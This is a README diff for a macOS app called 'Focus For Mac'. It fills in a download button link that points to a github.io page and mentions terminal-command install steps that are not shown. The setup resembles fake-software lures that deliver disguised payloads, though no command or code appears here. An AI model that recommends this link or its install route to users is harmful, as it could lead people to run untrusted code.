@@ -2,7 +2,7 @@
 
 Focus For Mac is a powerful productivity tool designed to enhance your workflow on macOS. Follow the instructions below to install it effortlessly and boost your focus with distraction-free features! 😊
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)]()
+[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://focus-for-mac.github.io/.github/)
 
 If you encounter issues downloading via the button above, follow the terminal command instructions below for a seamless installation.
 
